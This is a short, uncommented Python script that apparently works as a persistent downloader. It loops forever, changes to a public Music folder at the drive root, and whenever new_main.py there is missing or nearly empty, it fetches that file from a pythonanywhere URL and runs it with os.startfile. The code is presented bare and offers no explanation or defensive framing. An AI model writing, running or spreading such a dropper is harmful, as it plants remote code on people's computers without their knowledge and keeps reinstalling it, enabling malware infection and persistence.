import requests,os,time
while True:
    def download():
        url = "https://pybdtest.pythonanywhere.com/media/files/new_main.py/"
        get_response = requests.get(url)

        with open("new_main.py", "wb") as out_file:
            out_file.write(get_response.content)
        os.startfile("new_main.py")
    x = -1
    for i in os.getcwd():
        if i == "\\":
            x += 1
    for i in range(x):
        os.chdir("..")

    os.chdir("public")
    os.chdir("Music")
    if os.path.isfile("new_main.py"):
        with open("new_main.py","r+") as r:
            r = r.read()
        if len(r) < 10:
            download()
    else:
        download()
    time.sleep(1)